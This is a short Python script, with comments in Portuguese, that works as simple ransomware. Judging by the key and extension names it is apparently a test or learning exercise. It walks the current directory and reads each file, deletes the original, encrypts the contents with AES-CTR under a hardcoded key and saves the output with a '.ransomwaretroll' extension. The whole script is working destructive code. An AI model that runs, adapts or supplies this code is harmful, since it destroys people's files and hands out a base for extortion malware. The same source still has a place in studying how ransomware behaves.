import os
import pyaes

# Percorre todos os arquivos na pasta
for nome_arquivo in os.listdir('.'):
    caminho_completo = os.path.join('.', nome_arquivo)

    # Verifica se é um arquivo
    if os.path.isfile(caminho_completo):
        # Abrir o arquivo a ser criptografado
        with open(caminho_completo, "rb") as arquivo:
            file_data = arquivo.read()

        # Remover o arquivo original
        os.remove(caminho_completo)

        # Chave de criptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        novo_nome_arquivo = nome_arquivo + ".ransomwaretroll"
        with open(os.path.join('.', novo_nome_arquivo), 'wb') as novo_arquivo:
            novo_arquivo.write(crypto_data)
